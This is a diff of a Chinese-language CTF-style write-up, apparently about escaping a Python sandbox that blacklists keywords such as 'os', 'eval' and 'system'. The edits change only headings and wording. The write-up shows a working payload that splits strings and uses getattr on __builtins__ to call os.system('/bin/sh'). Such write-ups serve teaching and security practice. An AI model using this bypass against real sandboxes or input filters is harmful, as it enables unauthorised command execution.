@@ -5,7 +5,7 @@
 > - 使用`__import__`函数替代`import`
 > - 通过拆分字符串来避免黑名单  
   
-### 源码 - chall.py  
+## 源码 - chall.py  
 ```python
 def chall():
     blacklist = ['os','exec','eval','import','system']
@@ -20,15 +20,15 @@ if __name__ == '__main__':
     chall()
 ```
 
-### 分析  
-通过阅读代码易知，程序通过简单的字符串黑名单匹配来禁止`os` `exec` `eval` `import` `system`等指令  
+## 分析  
+通过阅读代码易知，程序通过简单的字符串黑名单匹配来禁止`os` `exec` `eval` `import` `system`指令  
 通过字符串拆分的方式就可以绕过，如将`import`拆成`imp`+`ort`  
 但是这种方式**只能用于字符串**，那应该怎样 import 呢？  
 内置函数`getattr`可以做到这一点  
-[`getattr`食用说明](https://www.runoob.com/python/python-func-getattr.html)  
+[**getattr**食用说明](https://www.runoob.com/python/python-func-getattr.html)  
 因此，我们只要调用`__builtins__`中的`__import__`即可  
 
-### 构造Payload  
+## 构造Payload  
 ```python
 getattr(getattr(__builtins__, '__impor' + 't__')('o' + 's'), 'syst' + 'em')('/bin/sh')
 ```
